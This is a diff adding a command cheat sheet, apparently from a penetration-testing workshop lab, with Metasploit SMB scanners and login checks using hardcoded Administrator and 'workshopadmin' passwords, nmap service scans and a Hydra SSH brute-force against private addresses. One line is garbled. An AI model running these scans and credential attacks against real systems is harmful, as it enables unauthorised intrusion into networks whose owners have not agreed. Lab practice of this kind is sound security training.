@@ -1,0 +1,61 @@
+msfconsole
+use auxiliary/scanner/portscan/syn
+set RHOSTS 10.0.1.4/24
+set THREADS 50
+run 
+
+use auxiliary/scanner/smb/pipe
+auditor set RHOSTS 10.0.1.4/24
+run 
+
+set SMBPass s3cr3t 
+set SMBUser Administrator 
+run 
+
+
+ use auxiliary/scanner/smb/pipe_auditor 
+show options
+set RHOSTS 10.0.1.4-6
+set THREADS 11
+run 
+
+set SMBPass s3cr3t
+set SMBUser workshopadmin
+run
+
+use auxiliary/scanner/smb/pipe_dcerpc_auditor
+show options
+set RHOSTS 10.0.1.4-6
+set THREADS 11
+run 
+
+ use auxiliary/scanner/smb/smb2
+show options
+set RHOSTS 10.0.1.4-6
+set THREADS 16
+run 
+
+use auxiliary/scanner/smb/smb_enumshares
+show options
+set RHOSTS 10.0.1.4-6
+set THREADS 16
+run 
+
+set SMBPass 1qaz!QAZ!QAZ
+set SMBUser Administrator 
+run 
+
+use auxiliary/scanner/smb/smb_login
+show options
+set RHOSTS 10.0.1.4-6
+set SMBPass 1qaz!QAZ!QAZ
+set SMBUser workshopadmin
+set THREADS 16
+run 
+
+
+nmap -sS -sV 10.0.0.4
+Search ssh
+nmap -v -A -sV 10.0.0.4
+hydra -s 22 -v -V -L /root/Desktop/user.txt -P /root/Desktop/password.txt -t 8 10.0.0.4 ssh
+
